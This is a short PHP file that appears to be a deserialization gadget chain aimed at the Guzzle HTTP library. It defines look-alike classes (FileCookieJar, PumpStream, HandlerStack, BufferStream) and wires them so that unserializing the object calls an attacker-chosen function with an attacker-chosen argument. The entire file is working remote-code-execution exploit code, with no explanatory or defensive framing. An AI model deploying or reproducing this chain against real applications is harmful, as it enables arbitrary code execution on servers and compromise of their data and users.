<?php
namespace GuzzleHttp {
  class HandlerStack {
    private $handler;
    private $stack;
    
    public function __construct($function, $parameter) {
      $this->handler = $parameter;
      $this->stack = [
        ["1"],
        ["set_exception_handler"],
        [
          [
            new \GuzzleHttp\Psr7\BufferStream('is_int'),
            "__toString"
          ]
        ],
        [$function]
      ];
    }
  }
}

namespace GuzzleHttp\Psr7 {
  class PumpStream {
    private $source;
    private $buffer;
    
    public function __construct($function, $parameter) {
      $this->buffer = new BufferStream('');
      $this->source = [
        new \GuzzleHttp\HandlerStack($function, $parameter),
        "resolve"
      ];
    }
  }
  
  class BufferStream {
    private $buffer;
    
    public function __construct($value) {
      $this->buffer = $value;
    }
  }
}

namespace GuzzleHttp\Cookie {
  class FileCookieJar {
    private $filename;

    public function __construct($function, $parameter) {
      $this->filename = new \GuzzleHttp\Psr7\PumpStream($function, $parameter);
    }
  }
}